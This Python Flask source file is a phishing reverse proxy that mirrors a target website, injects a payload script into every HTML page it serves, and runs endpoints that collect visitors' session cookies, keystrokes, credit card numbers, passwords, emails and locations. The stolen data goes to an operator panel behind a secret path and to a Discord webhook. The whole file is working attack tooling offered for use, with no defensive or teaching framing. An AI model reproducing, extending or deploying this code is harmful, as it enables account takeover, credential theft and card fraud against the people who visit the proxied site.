from flask import Flask, request, Response, send_from_directory, jsonify
import requests, re, json, os
from datetime import datetime
import brotli
from core.database import Database
from core.detection import DataDetector
from core.discord_bot import DiscordBot

# Initialize components
db = Database()
detector = DataDetector()
discord_bot = None  # Will be initialized when webhook is set

# Initialize storage
def ensure_json_files():
    files = ['cookies.json', 'requests.json', 'keylogs.json']
    for file in files:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                json.dump([], f)

ensure_json_files()
requests_history = []
MAX_HISTORY = 50

def start_proxy(target, host, port, secret):
    app = Flask(__name__, static_folder='panel', static_url_path='')

    # Serve panel files
    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/{secret}/<path:filename>')
    def panel_files(filename):
        return send_from_directory('panel', filename)

    # Serve payload script
    @app.route('/payload-script.js')
    def serve_payload():
        return send_from_directory('.', 'payload-script.js')

    @app.route('/ep/api/ping', methods=['POST'])
    def eat_cookie():
        cookies = request.cookies
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()

        cookie_data = []
        for key, value in cookies.items():
            cookie_info = {
                'name': key,
                'value': value,
                'timestamp': timestamp,
                'ip': user_ip,
                'url': request.referrer or 'Unknown'
            }
            cookie_data.append(cookie_info)
            
            # Save to database
            db.save_cookie(key, value, user_ip, request.referrer)
            
            # Send Discord notification if webhook is configured
            if discord_bot and discord_bot.webhook_url:
                discord_bot.send_cookie_alert(cookie_info)

        # Also save to JSON for backward compatibility
        with open('cookies.json', 'r') as f:
            existing_cookies = json.load(f)
        existing_cookies.extend(cookie_data)
        with open('cookies.json', 'w') as f:
            json.dump(existing_cookies, f)

        return jsonify({'message': 'Pong!'}), 200

    @app.route('/ep/api/sensitive', methods=['POST'])
    def handle_sensitive():
        data = request.json
        user_ip = request.remote_addr
        
        # Validate and process sensitive data
        if data['type'] == 'credit_card' and detector.is_valid_card(data['value']):
            db.save_sensitive_data('credit_card', data['value'], data['url'], user_ip)
            if discord_bot:
                discord_bot.send_sensitive_data_alert({
                    'type': 'Credit Card',
                    'url': data['url'],
                    'ip': user_ip
                })
        elif data['type'] in ['password', 'email']:
            db.save_sensitive_data(data['type'], data['value'], data['url'], user_ip)
            if discord_bot:
                discord_bot.send_sensitive_data_alert({
                    'type': data['type'].capitalize(),
                    'url': data['url'],
                    'ip': user_ip
                })

        return jsonify({'status': 'success'}), 200

    @app.route('/ep/api/settings', methods=['GET', 'POST'])
    def handle_settings():
        global discord_bot
        
        if request.method == 'POST':
            data = request.json
            webhook = data.get('discord_webhook', '')
            token = data.get('discord_token', '')
            
            try:
                # Save to database
                db.save_discord_settings(webhook, token)
                
                # Update discord bot
                if webhook and token:
                    discord_bot = DiscordBot(webhook, token)
                    
                return jsonify({
                    'status': 'success',
                    'message': 'Settings saved successfully'
                }), 200
                
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        else:
            # Get settings from database
            settings = db.get_discord_settings()
            return jsonify(settings), 200

    @app.route('/ep/api/getCookies', methods=['GET'])
    def get_cookies():
        try:
            with open('cookies.json', 'r') as f:
                cookies = json.load(f)
        except FileNotFoundError:
            cookies = []

        response_data = []
        for cookie in cookies:
            logged_time = datetime.fromisoformat(cookie['timestamp'])
            time_diff = datetime.now() - logged_time
            seconds_ago = time_diff.total_seconds()
            
            if seconds_ago < 60:
                time_str = f'Logged: {int(seconds_ago)} seconds ago'
            elif seconds_ago < 3600:
                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
            else:
                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'

            response_data.append({
                'name': cookie['name'],
                'value': cookie['value'],
                'timestamp': time_str,
                'ip': cookie.get('ip', 'unknown')
            })

        return jsonify(response_data), 200

    @app.route('/ep/api/geolocation', methods=['POST'])
    def handle_geolocation():
        data = request.json
        user_ip = request.remote_addr
        
        # Get detailed geolocation data
        geo_data = detector.get_geolocation(user_ip)
        if geo_data:
            db.save_geolocation(
                user_ip,
                data.get('lat', geo_data.get('lat')),
                data.get('lon', geo_data.get('lon')),
                geo_data.get('country', 'Unknown'),
                geo_data.get('city', 'Unknown')
            )
            
            if discord_bot and discord_bot.webhook_url:
                discord_bot.send_webhook({
                    "embeds": [{
                        "title": "📍 New Geolocation Data",
                        "fields": [
                            {"name": "IP", "value": user_ip, "inline": True},
                            {"name": "Location", "value": f"{geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')}", "inline": True},
                            {"name": "Coordinates", "value": f"Lat: {data.get('lat', 'N/A')}\nLon: {data.get('lon', 'N/A')}", "inline": True}
                        ]
                    }]
                })

        return jsonify({'status': 'success'}), 200

    @app.route('/ep/api/test_discord', methods=['POST'])
    def test_discord():
        if not discord_bot:
            return jsonify({
                'status': 'error',
                'message': 'Discord bot not configured'
            }), 400
        
        try:
            discord_bot.send_webhook({
                "content": "🔔 Discord integration test successful!"
            })
            return jsonify({'status': 'success'}), 200
        except Exception as e:
            return jsonify({
                'status': 'error',
                'message': str(e)
            }), 500

    @app.route('/ep/api/cleanup', methods=['POST'])
    def cleanup_data():
        days = request.json.get('days', 30)
        db.cleanup_old_data(days)
        return jsonify({'status': 'success'}), 200

    @app.route('/ep/api/serverInfo', methods=['GET'])
    def get_server_info():
        return jsonify({
            'target': target,
            'host': host,
            'port': str(port)
        }), 200

    @app.route('/ep/api/requests', methods=['GET'])
    def get_requests():
        return jsonify(requests_history[-MAX_HISTORY:])

    @app.route('/ep/api/clearCookies', methods=['POST'])
    def clear_cookies():
        try:
            with open('cookies.json', 'w') as f:
                json.dump([], f)
            db.clear_cookies()  # Clear from database too
            return jsonify({'status': 'success'}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/clearHistory', methods=['POST'])
    def clear_history():
        global requests_history
        requests_history = []
        return jsonify({'status': 'success'})

    @app.route('/ep/api/keylog', methods=['POST'])
    def save_keylog():
        data = request.json
        timestamp = datetime.now().isoformat()
        
        log_entry = {
            'keys': data['keys'],
            'url': data['url'],
            'timestamp': timestamp,
            'ip': request.remote_addr
        }
        
        with open('keylogs.json', 'r') as f:
            logs = json.load(f)
            
        logs.append(log_entry)
        
        with open('keylogs.json', 'w') as f:
            json.dump(logs, f)
            
        return jsonify({'status': 'success'})

    @app.route('/ep/api/getKeylog', methods=['GET'])
    def get_keylog():
        with open('keylogs.json', 'r') as f:
            logs = json.load(f)
        return jsonify(logs)

    @app.route('/ep/api/clearKeylog', methods=['POST'])
    def clear_keylog():
        with open('keylogs.json', 'w') as f:
            json.dump([], f)
        return jsonify({'status': 'success'})

    @app.route('/ep/api/keylogger', methods=['POST'])
    def save_keystrokes():
        data = request.json
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()

        keylog_data = {
            'keys': data['keys'],
            'url': data['url'],
            'ip': user_ip,
            'timestamp': timestamp
        }

        # Save to database
        db.save_keystrokes(data['keys'], data['url'], user_ip)

        # Save to JSON for backward compatibility
        try:
            with open('keylogs.json', 'r') as f:
                keylogs = json.load(f)
        except FileNotFoundError:
            keylogs = []

        keylogs.append(keylog_data)
        with open('keylogs.json', 'w') as f:
            json.dump(keylogs, f)

        # Send Discord notification if configured
        if discord_bot and discord_bot.webhook_url:
            discord_bot.send_keylogger_alert(keylog_data)

        return jsonify({'status': 'success'}), 200

    @app.route('/ep/api/getKeylogger', methods=['GET'])
    def get_keystrokes():
        try:
            with open('keylogs.json', 'r') as f:
                keylogs = json.load(f)
        except FileNotFoundError:
            keylogs = []

        response_data = []
        for log in keylogs:
            logged_time = datetime.fromisoformat(log['timestamp'])
            time_diff = datetime.now() - logged_time
            seconds_ago = time_diff.total_seconds()
            
            if seconds_ago < 60:
                time_str = f'Logged: {int(seconds_ago)} seconds ago'
            elif seconds_ago < 3600:
                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
            else:
                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'

            response_data.append({
                'keys': log['keys'],
                'url': log['url'],
                'timestamp': time_str,
                'ip': log.get('ip', 'unknown')
            })

        return jsonify(response_data), 200

    @app.route('/ep/api/clearKeylogger', methods=['POST'])
    def clear_keystrokes():
        try:
            with open('keylogs.json', 'w') as f:
                json.dump([], f)
            db.clear_keystrokes()  # Clear from database too
            return jsonify({'status': 'success'}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/exportData', methods=['GET'])
    def export_data():
        try:
            data = {
                'cookies': [],
                'keystrokes': [],
                'sensitive_data': []
            }
            
            # Get cookies
            try:
                with open('cookies.json', 'r') as f:
                    data['cookies'] = json.load(f)
            except FileNotFoundError:
                pass

            # Get keystrokes
            try:
                with open('keylogs.json', 'r') as f:
                    data['keystrokes'] = json.load(f)
            except FileNotFoundError:
                pass

            # Get sensitive data from database
            data['sensitive_data'] = db.get_sensitive_data()

            # If Discord webhook is configured, send data there too
            if discord_bot and discord_bot.webhook_url:
                discord_bot.send_webhook({
                    "content": "📤 Data Export",
                    "embeds": [{
                        "title": "Captured Data Summary",
                        "fields": [
                            {"name": "Cookies", "value": str(len(data['cookies'])), "inline": True},
                            {"name": "Keystrokes", "value": str(len(data['keystrokes'])), "inline": True},
                            {"name": "Sensitive Data", "value": str(len(data['sensitive_data'])), "inline": True}
                        ]
                    }]
                })

            return jsonify(data), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    def proxy(path):
        target_url = f"https://{target}/{path}"
        headers = {key: value for key, value in request.headers if key.lower() != 'host'}
        headers['Host'] = target

        try:
            resp = requests.request(
                method=request.method,
                url=target_url,
                headers=headers,
                params=request.args,
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=False,
                verify=False
            )

            # Log request
            request_log = {
                'timestamp': datetime.now().isoformat(),
                'method': request.method,
                'path': path,
                'status_code': resp.status_code,
                'ip': request.remote_addr
            }
            requests_history.append(request_log)
            if len(requests_history) > MAX_HISTORY:
                requests_history.pop(0)

            # Process response
            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
            headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]

            # Inject payload if HTML
            response = resp.content
            if 'text/html' in resp.headers.get('Content-Type', ''):
                try:
                    response = response.decode('utf-8')
                    if '</head>' in response:
                        payload = '<script src="/payload-script.js"></script>'
                        response = response.replace('</head>', f'{payload}</head>')
                    elif '<body>' in response:
                        payload = '<script src="/payload-script.js"></script>'
                        response = response.replace('<body>', f'<body>{payload}')
                    response = response.encode('utf-8')
                except UnicodeDecodeError:
                    pass  # Skip injection if we can't decode the response

            return Response(response, resp.status_code, headers)

        except Exception as e:
            return f"Error: {str(e)}", 500

    ssl_context = None  # Remove SSL for now to get basic functionality working
    app.run(host=host, port=port)